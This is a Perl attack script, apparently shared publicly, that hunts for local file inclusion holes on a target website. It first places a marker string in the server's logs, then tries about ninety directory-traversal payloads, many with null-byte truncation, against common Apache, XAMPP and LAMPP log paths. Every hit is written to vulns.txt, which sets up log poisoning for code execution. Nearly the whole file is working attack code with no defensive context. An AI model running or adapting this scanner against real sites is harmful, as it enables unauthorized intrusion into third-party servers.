#!/usr/bin/perl
#
# For LFI Scanner Logs - Public
#
# by DD3str0y3r
# dd3str0y3r@hotmail.com
#
use LWP::UserAgent;
use HTTP::Request;

if ($#ARGV != 1){
print "==========================================================\n";
print "For LFI Scanner Logs - Public\n\n";
print "Use: perl $0 host path\n";
print "Ex: perl $0 http://www.site.com.br /index.php?pg=\n";
print "==========================================================\n";}

$site = $ARGV[0];
$path = $ARGV[1];

$codigo = "/CODIGO.123";
$scanner = $site.$codigo;
my $request = HTTP::Request->new(GET=>$scanner);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(5);
my $resposta = $useragent->request($request);
if($resposta->content !~ /CODIGO.123/)
{print "\nCode can not be injected\n";}
else{

@lfi = ('../../../../../../../../../../../../../../../etc/httpd/logs/acces_log%00',
'../../../../../../../../../../../../../../../etc/httpd/logs/acces.log%00',
'../../../../../../../../../../../../../../../etc/httpd/logs/error_log%00',
'../../../../../../../../../../../../../../../etc/httpd/logs/error.log%00',
'../../../../../../../../../../../../../../../usr/local/apache/logs/access_log%00',
'../../../../../../../../../../../../../../../usr/local/apache/logs/access.log%00',
'../../../../../../../../../../../../../../../usr/local/apache/logs/error_log%00',
'../../../../../../../../../../../../../../../usr/local/apache/logs/error.log%00',
'../../../../../../../../../../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/access_log%00',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/access.log%00',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/error_log%00',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/error.log%00',
'../../../../../../../../../../../../../../../apache/logs/access.log%00',
'../../../../../../../../../../../../../../../apache/logs/error.log%00',
'../../../../../../../../../../../../../../../apache2/logs/error.log%00',
'../../../../../../../../../../../../../../../apache2/logs/access.log%00',
'../../../../../../../../../../../../../../../var/www/logs/access_log%00',
'../../../../../../../../../../../../../../../var/www/logs/access.log%00',
'../../../../../../../../../../../../../../../var/log/apache/access_log%00',
'../../../../../../../../../../../../../../../var/log/apache2/access_log%00',
'../../../../../../../../../../../../../../../var/log/apache/access.log%00',
'../../../../../../../../../../../../../../../var/log/apache2/access.log%00',
'../../../../../../../../../../../../../../../var/www/logs/error_log%00',
'../../../../../../../../../../../../../../../var/www/logs/error.log%00',
'../../../../../../../../../../../../../../../var/log/access_log%00',
'../../../../../../../../../../../../../../../var/log/access.log%00',
'../../../../../../../../../../../../../../../var/log/apache/error_log%00',
'../../../../../../../../../../../../../../../var/log/apache2/error_log%00',
'../../../../../../../../../../../../../../../var/log/apache/error.log%00',
'../../../../../../../../../../../../../../../var/log/apache2/error.log%00',
'../../../../../../../../../../../../../../../var/log/error_log%00',
'../../../../../../../../../../../../../../../var/log/error.log%00',
'../../../../../../../../../../../../../../../var/log/httpd/access_log%00',
'../../../../../../../../../../../../../../../var/log/httpd/error_log%00',
'../../../../../../../../../../../../../../../var/log/httpd/access.log%00',
'../../../../../../../../../../../../../../../var/log/httpd/error.log%00',
'../../../../../../../../../../../../../../../opt/lampp/logs/access_log%00',
'../../../../../../../../../../../../../../../opt/lampp/logs/error_log%00',
'../../../../../../../../../../../../../../../opt/xampp/logs/access_log%00',
'../../../../../../../../../../../../../../../opt/xampp/logs/error_log%00',
'../../../../../../../../../../../../../../../opt/lampp/logs/access.log%00',
'../../../../../../../../../../../../../../../opt/lampp/logs/error.log%00',
'../../../../../../../../../../../../../../../opt/xampp/logs/access.log%00',
'../../../../../../../../../../../../../../../opt/xampp/logs/error.log%00',
'../../../../../../../../../../../../../../../etc/httpd/logs/acces_log',
'../../../../../../../../../../../../../../../etc/httpd/logs/acces.log',
'../../../../../../../../../../../../../../../etc/httpd/logs/error_log',
'../../../../../../../../../../../../../../../etc/httpd/logs/error.log',
'../../../../../../../../../../../../../../../usr/local/apache/logs/access_log',
'../../../../../../../../../../../../../../../usr/local/apache/logs/access.log',
'../../../../../../../../../../../../../../../usr/local/apache/logs/error_log',
'../../../../../../../../../../../../../../../usr/local/apache/logs/error.log',
'../../../../../../../../../../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/access_log',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/access.log',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/error_log',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/error.log',
'../../../../../../../../../../../../../../../apache/logs/access.log',
'../../../../../../../../../../../../../../../apache/logs/error.log',
'../../../../../../../../../../../../../../../apache2/logs/error.log',
'../../../../../../../../../../../../../../../apache2/logs/access.log',
'../../../../../../../../../../../../../../../var/www/logs/access_log',
'../../../../../../../../../../../../../../../var/www/logs/access.log',
'../../../../../../../../../../../../../../../var/log/apache/access_log',
'../../../../../../../../../../../../../../../var/log/apache2/access_log',
'../../../../../../../../../../../../../../../var/log/apache/access.log',
'../../../../../../../../../../../../../../../var/log/apache2/access.log',
'../../../../../../../../../../../../../../../var/www/logs/error_log',
'../../../../../../../../../../../../../../../var/www/logs/error.log',
'../../../../../../../../../../../../../../../var/log/access_log',
'../../../../../../../../../../../../../../../var/log/access.log',
'../../../../../../../../../../../../../../../var/log/apache/error_log',
'../../../../../../../../../../../../../../../var/log/apache2/error_log',
'../../../../../../../../../../../../../../../var/log/apache/error.log',
'../../../../../../../../../../../../../../../var/log/apache2/error.log',
'../../../../../../../../../../../../../../../var/log/error_log',
'../../../../../../../../../../../../../../../var/log/error.log',
'../../../../../../../../../../../../../../../var/log/httpd/access_log',
'../../../../../../../../../../../../../../../var/log/httpd/error_log',
'../../../../../../../../../../../../../../../var/log/httpd/access.log',
'../../../../../../../../../../../../../../../var/log/httpd/error.log',
'../../../../../../../../../../../../../../../opt/lampp/logs/access_log',
'../../../../../../../../../../../../../../../opt/lampp/logs/error_log',
'../../../../../../../../../../../../../../../opt/xampp/logs/access_log',
'../../../../../../../../../../../../../../../opt/xampp/logs/error_log',
'../../../../../../../../../../../../../../../opt/lampp/logs/access.log',
'../../../../../../../../../../../../../../../opt/lampp/logs/error.log',
'../../../../../../../../../../../../../../../opt/xampp/logs/access.log',
'../../../../../../../../../../../../../../../opt/xampp/logs/error.log');
foreach $lfi(@lfi){

$scanner = $site.$path.$lfi;
my $request = HTTP::Request->new(GET=>$scanner);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(5);
my $resposta = $useragent->request($request);
if($resposta->content =~ /CODIGO.123/)
{print "\a";
print "\n$scanner\n";
open(a, ">>vulns.txt");
print a "$scanner\n";
close(a);}}}